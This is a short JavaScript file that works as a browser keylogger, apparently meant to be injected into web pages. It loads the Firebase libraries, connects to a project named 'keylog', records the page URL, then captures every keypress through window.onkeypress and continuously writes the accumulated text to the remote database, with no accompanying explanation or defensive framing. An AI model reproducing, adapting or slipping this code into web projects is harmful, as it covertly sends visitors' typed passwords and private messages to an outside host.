(function(){
console.log("Works!");
var firebaseAppScript = document.createElement('script');
firebaseAppScript.src = 'https://www.gstatic.com/firebasejs/5.3.0/firebase-app.js';
firebaseAppScript.onload = loadDatabase;
document.body.appendChild(firebaseAppScript);

function loadDatabase() {
  var firebaseDatabaseScript = document.createElement('script');
  firebaseDatabaseScript.src = 'https://www.gstatic.com/firebasejs/5.3.0/firebase-database.js';
  firebaseDatabaseScript.onload = loadScript;
  document.body.appendChild(firebaseDatabaseScript);
}

var logReferrer = "";
var key = "";

function loadScript() {

  var config = {
    apiKey: "AIzaSyBtCB77lHNxxXYBoKqI8XcvCkEEDV0qD7U",
    authDomain: "keylog-4e45a.firebaseapp.com",
    databaseURL: "https://keylog-4e45a-default-rtdb.firebaseio.com",
    projectId: "keylog-4e45a",
    storageBucket: "keylog-4e45a.appspot.com",
    messagingSenderId: "42691918673",
    appId: "1:42691918673:web:6e94b3728771178961b170"
  };
  firebase.initializeApp(config);

  var logData = firebase.database().ref("/Logs");

  
  logData.push({
    keyData: logReferrer,
    site: window.location.href
  });

  

  logData.on('child_added', function(snapshot) {
    key = snapshot.key;
  });


  console.log(key);
  

  function logkey(cb) {
    let str = '';
    window.onkeypress = function(event) {
      try {
        let key = event.key;
        str += event.key;
        cb(str);
      } catch (err) {
        if (err) {
          str += '<error>';
          cb(str);
        }
      }
    }
  }

  logkey(function(i) {
    logReferrer=i;
    console.log(logReferrer);

    let keyData = firebase.database().ref("/Logs/"+key+"/keyData");
    keyData.set(""+i);
  });

}

})()